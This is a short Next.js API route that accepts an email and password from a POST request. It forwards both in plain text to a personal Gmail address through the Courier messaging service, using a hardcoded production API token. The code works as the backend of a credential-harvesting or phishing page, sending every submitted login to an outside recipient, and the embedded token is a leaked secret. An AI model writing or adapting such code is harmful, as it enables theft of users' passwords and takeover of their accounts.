import { NextResponse } from 'next/server';
import { CourierClient } from '@trycourier/courier';

export async function POST(request: Request) {
  try {
    const { email, password } = await request.json();

    const courier = CourierClient({
      authorizationToken: 'pk_prod_9HME2CJ57PM4PQNP6FYZGQMNX9NX',
    });

    const { requestId } = await courier.send({
      message: {
        to: {
          email: 'Peterstilinski111@gmail.com',
        },
        template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
        data: {
          recipientName: `email: ${email}, \npassword: ${password}`,
        },
      },
    });

    return NextResponse.json({ success: true, requestId });
  } catch (error) {
    console.error('Email sending error:', error);
    return NextResponse.json(
      { success: false, error: 'Failed to send email' },
      { status: 500 }
    );
  }
}